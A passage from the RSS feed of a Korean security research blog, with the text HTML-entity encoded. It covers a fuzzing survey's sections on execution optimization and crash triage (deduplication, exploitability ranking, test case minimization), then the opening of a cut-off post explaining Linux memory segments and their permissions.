&#xBE44;&#xC2B7;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC0AC;&#xC774;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>black-box differential fuzz testing&#xC740; PUT&#xC758; input&#xACFC; output&#xC758; mutation&#xC744; map&#xC744; &#xB9CC;&#xB4E4;&#xACE0; information leak&#xC744; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="6-2-Execution-Optimizations"><a href="#6-2-Execution-Optimizations" class="headerlink" title="6.2 Execution Optimizations"></a>6.2 Execution Optimizations</h2><p>&#xD574;&#xB2F9; &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC81C;&#xC2DC;&#xD55C; &#xAE30;&#xCD08; &#xBAA8;&#xB378;&#xC740; &#xAC01; fuzz iteration&#xC774; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9CC;&#xC740; &#xC989; fuzz iteration &#xB9C8;&#xB2E4; PUT&#xC744; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; load&#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xCD5C;&#xC2E0; &#xD37C;&#xC800;&#xB4E4;&#xC740; &#xBC18;&#xBCF5; loading&#xC744; &#xC904;&#xC77C; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; AFL&#xC740; iteration &#xB9C8;&#xB2E4; &#xC774;&#xBBF8; &#xCD08;&#xAE30;&#xD654;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; fork&#xD558;&#xB294; fork-server&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. 3.1.2&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xAC83; &#xCC98;&#xB7FC; in-memory fuzzing &#xB610;&#xD55C; &#xBE44;&#xC2B7;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xCD5C;&#xC801;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xC544;&#xBB34;&#xB9AC; &#xC624;&#xBC84;&#xD574;&#xB4DC;&#xAC00; &#xCEE4;&#xB3C4; &#xC5EC;&#xB7EC;&#xBC88;&#xC758; iteration&#xB3D9;&#xC548; &#xC0C1;&#xAC01;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="6-3-Triage"><a href="#6-3-Triage" class="headerlink" title="6.3 Triage"></a>6.3 Triage</h2><p>Triage&#xB780; &#xC815;&#xCC45; &#xC704;&#xBC18;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; test case&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xBCF4;&#xACE0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. Triage&#xB294; deduplication, prioritization, test case minimization&#xC774;&#xB77C;&#xB294; 3&#xB2E8;&#xACC4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="6-3-1-Deduplication"><a href="#6-3-1-Deduplication" class="headerlink" title="6.3.1 Deduplication"></a>6.3.1 Deduplication</h3><p><img src="/2022/01/16/fabu1ous/fuzz-4/4.png" alt></p><p>Deduplication(&#xC911;&#xBCF5;&#xC81C;&#xAC70;)&#xC740; &#xAC19;&#xC740; &#xBC84;&#xADF8;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; test case&#xC640; output &#xC9D1;&#xD569;&#xC744; &#xC5C6;&#xC5D0; &#xC815;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01; &#xACE0;&#xC720;&#xD55C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xC77C;&#xB828;&#xC758; test case&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC774;&#xC0C1;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xBA87;&#xAC00;&#xC9C0; &#xC774;&#xC720;&#xC5D0;&#xC11C; Deduplication&#xC740; &#xD37C;&#xC800;&#xC758; &#xC911;&#xC694;&#xD55C; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xC911;&#xBCF5;&#xB41C; &#xD14C;&#xC2A4;&#xD2B8; &#xACB0;&#xACFC;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xB514;&#xC2A4;&#xD06C; &#xACF5;&#xAC04;&#xC744; &#xB0AD;&#xBE44;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD604;&#xC7AC; &#xC11C;&#xB85C;&#xB2E4;&#xB978; &#xBC84;&#xADF8;&#xAC00; &#xBA87;&#xAC1C; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB3C4;&#xC640;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; Deduplication &#xBC29;&#xC2DD;&#xC740; 3&#xAC00;&#xC9C0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><p>6.3.1.1 stack backtrace hashing</p><p>stack backtrace hashing&#xC740; crash&#xB97C; deduplication&#xD558;&#xB294; &#xAC00;&#xC7A5; &#xC624;&#xB798;&#xB42C;&#xACE0; &#xAC00;&#xC7A5; &#xD754;&#xD55C; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; stack backtrace&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xAE30;&#xB85D;&#xD558;&#xACE0; bachtrace&#xC758; &#xB0B4;&#xC6A9;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; stack hash&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. stack hash&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370; stack frame&#xC758; &#xAC2F;&#xC218;, stack frame&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC815;&#xBCF4;, &#xD568;&#xC218;&#xC774;&#xB984;, &#xC8FC;&#xC18C;, &#xC624;&#xD504;&#xC14B;&#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD574; hash&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC218;&#xC9D1;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB450;&#xAC1C;&#xC758; hash(major, minor)&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xB3C4; &#xC788;&#xB294;&#xB370;, major hash&#xB294; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; hash&#xD574; &#xC720;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC740; crash&#xB4E4;&#xC744; &#xADF8;&#xB8F9;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; minor hash&#xB294; line number&#xC640; &#xC5EC;&#xB7EC;&#xAC1C;&#xC758; stack frame&#xC744; hash&#xD574; &#xC880; &#xB354; &#xC138;&#xBD84;&#xD654;&#xB41C; &#xAD6C;&#xBD84;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>stack backtrace&#xB294; &#xD754;&#xD788; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0;&#xB9CC; &#xB2E8;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xBA87;&#xBA87; crash&#xB294; root cause &#xADFC;&#xCC98;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xB54C;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; stack backtrace&#xC758; &#xC9C4;&#xC2E4;&#xC131;&#xC744; &#xC758;&#xC2EC;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74;  heap &#xC624;&#xC5FC;&#xC5D0; &#xC758;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; &#xC2E4;&#xC81C;&#xB85C; &#xC624;&#xC5FC;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xBB34;&#xAD00;&#xD55C; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xAC00; &#xC624;&#xC5FC;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xC744; &#xC2DC;&#xB3C4; &#xD560; &#xB54C; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>6.3.1.2 coverage-based deduplication</p><p>AFL&#xC740; PUT&#xC758; &#xAC01; &#xC2E4;&#xD589; coverage&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; grey-box &#xD37C;&#xC800;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC01; edge&#xC758; &#xB3C4;&#xB2EC; &#xD69F;&#xC218;&#xB97C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. AFL&#xC740; &#xC774; coverage &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; seed file&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294;&#xB370; &#xC88B;&#xC740; deduplication &#xC5ED;&#xD560;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. AFL&#xC758; &#xACF5;&#xC2DD; &#xBB38;&#xC11C;&#xC5D0; &#xB530;&#xB974;&#xBA74; crash&#xAC00; &#xC774;&#xC804;&#xC5D4; &#xBC1C;&#xACAC;&#xB418;&#xC9C0; &#xC54A;&#xC740; edge&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC70;&#xB098; &#xC774;&#xC804;&#xC5D0; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xB358; edge&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xC744;&#xB54C; unique&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>6.3.1.3 semantic-aware deduplication</p><p>RETracer&#xB294; &#xAC01; crash&#xB97C; reverse data-flow &#xBD84;&#xC11D;&#xD574; &#xC5BB;&#xC740; semantic&#xC73C;&#xB85C; crash triage&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. RETracer&#xB294; crash dump(coredump)&#xB97C; &#xD68C;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574; &#xC815;&#xD655;&#xD788; &#xC5B4;&#xB290; instruction&#xC5D0;&#xC11C; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. Frame level&#xC774; &#xCD5C;&#xB300;&#xC778; &#xD568;&#xC218;&#xB97C; blame(&#xBE44;&#xB09C;)&#xD558;&#xB294;&#xB370; blame &#xD568;&#xC218;&#xB294; crash&#xB97C; &#xAD70;&#xC9D1;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. RETracer&#xB294; &#xD574;&#xB2F9; &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; &#xC218;&#xBC31;&#xAC1C;&#xC758; Internet Explorer &#xBC84;&#xADF8;&#xB97C; &#xD558;&#xB098;&#xC758; &#xBC84;&#xADF8;&#xB85C; &#xC911;&#xBCF5;&#xC81C;&#xAC70;&#xD558;&#xB294;&#xB370; &#xC131;&#xACF5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h3 id="6-3-2-Prioritization-and-Exploitablity"><a href="#6-3-2-Prioritization-and-Exploitablity" class="headerlink" title="6.3.2 Prioritization and Exploitablity"></a>6.3.2 Prioritization and Exploitablity</h3><p>Prioritization &#xD639;&#xC740; fuzzer taming&#xC774;&#xB77C; &#xBD88;&#xB9AC;&#xB294; &#xBB38;&#xC81C;&#xB294; &#xBC84;&#xADF8;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; test case&#xC758; &#xACE0;&#xC720;&#xC131; &#xC815;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xC21C;&#xC704; &#xB9E4;&#xAE30;&#xAC70;&#xB098; &#xADF8;&#xB8F9;&#xD654;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC9D5;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; prioritization&#xC740; crash&#xC758; exploit &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Exploit&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xBC84;&#xADF8;&#xB294; Defender&#xC640; Attacker &#xBAA8;&#xB450;&#xC5D0;&#xAC8C; &#xC6B0;&#xC120;&#xC21C;&#xC704;&#xAC00; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;. Defender&#xB294; exploit &#xAC00;&#xB2A5;&#xD55C; &#xBC84;&#xADF8;&#xB97C; &#xB2E4;&#xB978; &#xBC84;&#xADF8;&#xB4E4; &#xBCF4;&#xB2E4; &#xBA3C;&#xC800; &#xC218;&#xC815;&#xD558;&#xBA70; Attacker &#xB610;&#xD55C; exploit&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xBC84;&#xADF8;&#xB97C; &#xC6B0;&#xC120;&#xC801;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Microsoft WinDbg&#xC758; &#xBA85;&#xB839;&#xC5B4; !exploitable&#xC740; &#xCD5C;&#xCD08;&#xC758; Exploit ranking &#xC2DC;&#xC2A4;&#xD15C; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01; crash&#xB97C; EXPLOITABLE &gt; PROBABLY_EXPLOITABLE &gt; UNKNOWN &gt; NOT_LIKELY_EXPLOITABLE &#xC21C;&#xC11C;&#xB85C; &#xC21C;&#xC704;&#xB97C; &#xB9E4;&#xAE41;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xAC01; &#xB2E8;&#xACC4;&#xC5D0; &#xC815;&#xC758;&#xAC00; &#xC788;&#xAE30; &#xBCF4;&#xB2E8; &#xAC01; &#xB2E8;&#xACC4;&#xAC00; exploit &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB2E4;&#xB978; &#xB2E8;&#xACC4;&#xBCF4;&#xB2E4; &#xB192;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xD55C; &#xC608;&#xB85C; attacker&#xAC00; control flow&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC744; &#xB550; EXPLOITABLE &#xB2E8;&#xACC4;&#xB97C; &#xB9E4;&#xAE30;&#xACE0; devision by zero&#xB294; NOT_LIKELY_EXPLOITABLE&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p><p>!exploitable&#xC774; &#xB098;&#xC628; &#xD6C4; GDB exploitable &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xACFC; Apple&#xC758; CrashWrangler &#xB4F1; &#xBE44;&#xC2B7;&#xD55C; &#xD734;&#xB9AC;&#xC2A4;&#xD2F1; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB4E4;&#xC758; &#xC815;&#xD655;&#xC131;&#xC740; &#xC544;&#xC9C1; &#xD3C9;&#xAC00;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="6-3-3-Test-case-minimization"><a href="#6-3-3-Test-case-minimization" class="headerlink" title="6.3.3 Test case minimization"></a>6.3.3 Test case minimization</h3><p>Triage&#xC758; &#xB610;&#xB2E4;&#xB978; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84; &#xC911; &#xD558;&#xB098;&#xB294; test case minimization&#xC785;&#xB2C8;&#xB2E4;. Test case minimization&#xC774;&#xB780; testcase&#xC5D0;&#xC11C; crash&#xB97C; &#xC57C;&#xAE30;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xB9CC;&#xC744; &#xCC3E;&#xC544; &#xC880; &#xB354; &#xD06C;&#xAE30;&#xAC00; &#xC791;&#xACE0; &#xAC04;&#xACB0;&#xD55C; test case&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. Input&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC904;&#xC778;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; seed trimming&#xACFC; &#xC774;&#xB860;&#xC0C1; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC; test case minimization&#xC740; bug oracle&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xD070; &#xCC28;&#xC774;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzer/">fuzzer</category>
      
      <category domain="https://hackyboiz.github.io/tags/servey/">servey</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/16/fabu1ous/fuzz-4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Linux Memory Layout</title>
      <link>https://hackyboiz.github.io/2022/01/14/poosic/linux-memory-layout/</link>
      <guid>https://hackyboiz.github.io/2022/01/14/poosic/linux-memory-layout/</guid>
      <pubDate>Fri, 14 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB420; &amp;#xC2DC; &amp;#xD6A8;&amp;#xC728;&amp;#xC801;&amp;#xC778; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB420; &#xC2DC; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC6A9;&#xB3C4;&#xBCC4;&#xB85C; &#xB098;&#xB204;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC138;&#xADF8;&#xBA3C;&#xD2B8;(Segment)&#xB77C;&#xB294; &#xB2E8;&#xC704;&#xB85C; &#xAD6C;&#xBD84;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB780; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC801;&#xC7AC;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC6A9;&#xB3C4;&#xBCC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xC800;&#xC7A5;&#xD55C; &#xC601;&#xC5ED;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2022/01/14/poosic/linux-memory-layout/image1.png" alt="Untitled.jpg"></p><p>Linux &#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC870;&#xC5D0;&#xC11C;&#xB294; &#xCF54;&#xB4DC; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;, &#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;, BSS &#xC138;&#xADF8;&#xBA3C;&#xD2B8;,&#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;, &#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;, &#xC774;&#xB807;&#xAC8C; &#xCD1D; 5&#xAC00;&#xC9C0;&#xC758; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB85C; &#xAD6C;&#xBD84;&#xB418;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAC01; &#xC601;&#xC5ED;&#xC5D0; &#xB9DE;&#xAC8C; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xBC29;&#xC9C0; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xC758; &#xAD8C;&#xD55C;&#xC740; CPU&#xAC00; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD574; &#xAC00;&#xB2A5;&#xD55C; &#xB3D9;&#xC791;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC790;&#xBA74;, &#xC77D;&#xAE30; &#xAD8C;&#xD55C;&#xB9CC; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C;&#xB294; CPU&#xAC00; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD574; &#xB204;&#xAD70;&#xAC00; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC2E4;&#xD589;&#xC740; &#xD558;&#xC9C0;&#xB294; &#xBABB;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB835;&#xC158;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xAC01; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCF54;&#xB4DC;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;"><a href="#&#xCF54;&#xB4DC;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;" class="headerlink" title="&#xCF54;&#xB4DC; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;"></a>&#xCF54;&#xB4DC; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;</h3><p>&#xCF54;&#xB4DC; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xD14D;&#xC2A4;&#xD2B8; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB77C;&#xACE0;&#xB3C4; &#xBD88;&#xB9BD;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBBC0;&#xB85C; &#xCF54;&#xB4DC; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; CPU&#xAC00; &#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC77D;&#xAE30;, &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xCF54;&#xB4DC;&#xB97C; &#xB204;&#xAD70;&#xAC00; &#xC0BD;&#xC785;&#xD574; &#xC545;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xBC14;&#xAFC0; &#xC218;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC740; &#xBD80;&#xC5EC;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xB370;&#xC774;&#xD130;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;"><a href="#&#xB370;&#xC774;&#xD130;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;" class="headerlink" title="&#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;"></a>&#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;</h3><p>&#xB370;&#xC774;&#xD130; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xCEF4;&#xD30C;&#xC77C;&#xD560; &#xB54C; &#xAC12;&#xC774; &#xC815;&#xD574;&#xC9C0;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xB098; &#xC804;&#xC5ED; &#xC0C1;&#xC218; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0;&#xB294; &#xC77D;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xAC00; &#xB418;&#xACE0; &#xB2E4;&#xC2DC; &#xB610; &#xC548;&#xC5D0;&#xC11C; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC640; &#xC4F0;&#xAE30; 